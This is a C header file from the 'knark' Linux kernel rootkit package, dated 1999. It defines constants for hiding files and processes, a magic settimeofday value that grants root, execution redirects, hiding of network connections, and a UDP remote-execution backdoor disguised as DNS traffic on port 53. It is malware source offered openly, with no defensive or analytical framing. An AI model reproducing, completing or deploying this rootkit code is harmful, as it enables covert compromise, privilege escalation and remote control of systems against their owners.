/*
 * knark.h, part of the knark package
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 * 
 * Some parts of this can be changed, but things might break so I advice you
 * to leave it as it is.
 * See README for more info.
 */

#ifndef _KNARK_H
#define _KNARK_H

#define KNARK_VERSION "v0.59"

#define MODULE_NAME "knark"


#define MAX_SECRET_FILES 12
#define MAX_SECRET_DEVS 4


#ifdef DEBUG
# ifdef __KERNEL__
#  define knark_debug(fmt, args...) printk(fmt, ## args)
# else
#  define knark_debug(fmt, args...) fprintf(stderr, fmt, ## args)
# endif
#else
#define knark_debug(fmt, args...)
#endif


#define SIGINVISIBLE 31
#define SIGVISIBLE 32


/* ioctl stuff */
#define KNARK_ELITE_CMD 0xfffffffe

#define KNARK_HIDE_FILE 1
#define KNARK_UNHIDE_FILE 2


/* knark_settimeofday */
#define KNARK_GIMME_ROOT 9000

#define KNARK_ADD_REDIRECT 9001
#define KNARK_CLEAR_REDIRECTS 9002

#define KNARK_ADD_NETHIDE 9003
#define KNARK_CLEAR_NETHIDES 9004

struct exec_redirect
{
    char *er_from;
    char *er_to;
};


/* udp-wrapper */
#define UDP_REXEC_USERPROGRAM 0x0deadbee
#define UDP_REXEC_SRCPORT 53
#define UDP_REXEC_DSTPORT 53

#define SPACE_REPLACEMENT 254

/* Ok, time for some self-promotion again. I'm hopeless. */
void author_banner(const char *progname);

#endif _KNARK_H
